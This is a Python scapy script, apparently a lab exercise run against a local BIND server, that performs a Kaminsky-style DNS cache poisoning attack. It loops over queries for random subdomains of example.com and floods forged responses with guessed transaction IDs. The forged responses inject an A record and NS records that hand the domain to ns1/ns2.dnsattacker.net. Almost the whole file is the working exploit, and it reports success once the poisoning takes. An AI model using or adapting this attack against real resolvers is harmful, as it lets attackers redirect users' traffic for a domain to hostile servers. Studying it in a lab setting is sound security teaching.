#!/usr/bin/env python
import argparse
import socket

from scapy.all import DNS, DNSQR, DNSRR
from random import randint, choice
from string import ascii_lowercase, digits


parser = argparse.ArgumentParser()
parser.add_argument(
    "--dns_port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument(
    "--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = '127.0.0.1'
# your bind's port (DNS queries are send to this port)
my_port = args.dns_port
# port that your bind uses to send its DNS queries
my_query_port = args.query_port

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
    return ''.join(choice(ascii_lowercase + digits) for _ in range(10))


'''
Generates random 8-bit integer.
'''
def getRandomTXID():
    return randint(0, 256)


'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))


'''
Example code that sends a DNS query using scapy.
'''
def exampleSendDNSQuery():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    spoof_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    i = 0
    while True:
        sub_domain = getRandomSubDomain()
        dnsPacket = DNS(id=99, qdcount=1, qd=DNSQR(qname=sub_domain + '.example.com.'))

        # Spoof packet
        spoof_template = DNS(
            aa=1,
            rd=1, ra=1, qr=1, qdcount=1, ancount=1, nscount=2, arcount=0,
            qd=DNSQR(qname=sub_domain + '.example.com.'),
            an=DNSRR(rrname=sub_domain + '.example.com.', ttl=70000, type='A', rdata ='5.6.6.8'),
            ns=DNSRR(rrname='example.com.', ttl=70000, type='NS', rdata="ns1.dnsattacker.net")
               / DNSRR(rrname='example.com.', ttl=70000, type='NS', rdata="ns2.dnsattacker.net")
        )

        sendPacket(sock, dnsPacket, my_ip, my_port)
        for j in range(90, 120):
            spoof_template[DNS].id = j
            sendPacket(spoof_sock, spoof_template, my_ip, my_query_port)

        i += 1
        response = sock.recv(4096)
        response = DNS(response)

        if response[DNS].rcode != 3:
            print "Successfully poisonned our target with a dummy record !!"
            break
        else:
            print i


if __name__ == '__main__':
    exampleSendDNSQuery()
